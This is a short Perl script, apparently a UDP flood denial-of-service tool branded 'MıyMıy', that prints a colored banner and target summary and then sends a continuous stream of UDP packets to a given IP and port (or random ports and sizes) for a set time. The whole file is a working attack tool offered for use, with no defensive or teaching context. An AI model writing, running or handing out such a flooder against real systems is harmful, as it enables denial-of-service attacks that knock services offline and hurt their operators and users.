#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##########
# MıyMıy #
##########

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Such As 192.168.l.l 80 9999 120$ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;

 ___ ___  ____  __ __         ___ ___  ____  __ __ 
|   |   ||    ||  |  |       |   |   ||    ||  |  |
| _   _ | |  | |  |  | _____ | _   _ | |  | |  |  |
|  \_/  | |  | |  ~  ||     ||  \_/  | |  | |  ~  |
|   |   | |  | |___, ||_____||   |   | |  | |___, |
|   |   | |  | |     |       |   |   | |  | |     |
|___|___||____||____/        |___|___||____||____/ 
                                                   

EOTEXT
print BOLD GREEN<<EOTEXT;
=================
=  Targets Info =
=================
[+] Ip Address = $ip

[+] Port = $port

[+] Package = $size

[+] Time = $time

EOTEXT
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
